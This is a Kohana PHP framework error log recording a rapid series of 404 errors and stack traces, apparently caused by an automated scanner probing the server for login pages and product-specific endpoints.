2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL pools was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL pools was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: App_Themes/Default/Images/favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: App_Themes/Default/Images/favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apps/zxtm/login.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apps/zxtm/login.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL versa/login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL versa/login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/server/version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/server/version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: images/logo.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: images/logo.gif ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL health was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL health was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL p/login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL p/login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:46 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ext-js/app/common/zld_product_spec.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:46 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ext-js/app/common/zld_product_spec.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL portal was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL portal was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL status was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL status was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: info.asp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login/login.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: info.asp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login/login.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL lms/db was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL lms/db was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL allversions was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL allversions was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/param.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/param.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: rest/applinks/1.0/manifest ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: rest/applinks/1.0/manifest ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL magento_version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL magento_version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL allversions was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL allversions was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/vip/i18n/api/v2/translation/products/vRNIUI/versions/1 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/vip/i18n/api/v2/translation/products/vRNIUI/versions/1 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: r-seenet/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: r-seenet/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ext-js/app/common/zld_product_spec.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ext-js/app/common/zld_product_spec.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL versions was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL versions was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login/login.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login/login.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/vip/i18n/api/v2/translation/products/vRNIUI/versions/1 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/vip/i18n/api/v2/translation/products/vRNIUI/versions/1 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: geoserver/web/wicket/bookmarkable/org.geoserver.web.AboutGeoServerPage ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Portal/Portal.mwsl ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Portal/Portal.mwsl ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: r-seenet/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: r-seenet/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tos/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tos/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:47 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WebApp/js/UI_String.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:47 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WebApp/js/UI_String.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: docs/cplugError.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: docs/cplugError.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WebApp/js/UI_String.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WebApp/js/UI_String.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL c/login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL c/login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL c/login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL c/login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL portal was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL portal was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tos/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tos/index.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: themes/admin/default/build/assets/favicon-19fbef86.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: themes/admin/default/build/assets/favicon-19fbef86.svg ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: officescan/console/cgi/cgiChkMasterPwd.exe ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: officescan/console/cgi/cgiChkMasterPwd.exe ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: officescan/console/html/localization.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: officescan/console/html/localization.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: officescan/console/html/localization.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: officescan/console/html/localization.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/v1.0/environment ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/v1.0/environment ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL kylin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL kylin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: officescan/console/cgi/cgiChkMasterPwd.exe ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: officescan/console/cgi/cgiChkMasterPwd.exe ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL kylin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL kylin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dashboard/favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dashboard/favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: IPCamDesc.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: IPCamDesc.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/v1.0/environment ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/v1.0/environment ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cslu/v1/core/conf was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cslu/v1/core/conf was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL webui was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL webui was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:48 --- ERROR: Kohana_Exception [ 0 ]: Cannot create instances of abstract controller_config ~ SYSPATH/classes/kohana/request/client/internal.php [ 96 ]
2025-10-24 13:20:48 --- STRACE: Kohana_Exception [ 0 ]: Cannot create instances of abstract controller_config ~ SYSPATH/classes/kohana/request/client/internal.php [ 96 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cslu/v1/core/conf was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cslu/v1/core/conf was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: kubepi/fav.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: kubepi/fav.png ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
